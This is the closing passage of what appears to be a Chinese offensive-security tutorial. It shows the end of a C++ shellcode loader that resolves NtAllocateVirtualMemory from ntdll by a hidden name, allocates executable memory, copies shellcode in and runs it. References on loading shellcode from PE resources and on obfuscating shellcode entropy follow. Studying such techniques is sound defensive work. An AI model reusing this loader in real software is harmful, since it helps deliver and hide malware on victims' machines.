    <span class="n">pNtAllocateVirtualMemory</span> <span class="n">NtAllocateVirtualMemory</span> <span class="o">=</span> <span class="p">(</span><span class="n">pNtAllocateVirtualMemory</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="sa">L</span><span class="s">"ntdll.dll"</span><span class="p">),</span> <span class="n">str1</span><span class="p">);</span>
    <span class="n">NTSTATUS</span> <span class="n">status</span> <span class="o">=</span> <span class="n">NtAllocateVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="o">&amp;</span><span class="n">lpMem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">uSize</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>


    <span class="n">memcpy</span><span class="p">(</span><span class="n">lpMem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">.</span><span class="n">data</span><span class="p">(),</span> <span class="n">shellcode</span><span class="p">.</span><span class="n">size</span><span class="p">());</span>

    <span class="k">typedef</span> <span class="nf">void</span> <span class="p">(</span><span class="o">*</span><span class="n">ShellcodeFunc</span><span class="p">)();</span>
    <span class="n">ShellcodeFunc</span> <span class="n">execShellcode</span> <span class="o">=</span> <span class="p">(</span><span class="n">ShellcodeFunc</span><span class="p">)</span><span class="n">lpMem</span><span class="p">;</span>
    <span class="n">execShellcode</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241115164803-536fd518-a32e-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241115164809-570f505e-a32e-1.png"/></p>
<h1 data-content="1" id="4b058dbfb7b4a2e9e79991c1ea087393">参考</h1>
<p><a href="https://www.ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources" target="_blank">https://www.ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources</a></p>
<p><a href="https://rileykidd.com/2022/06/10/obfuscating-shellcode-entropy/" target="_blank">https://rileykidd.com/2022/06/10/obfuscating-shellcode-entropy/</a></p>
</div>
</div>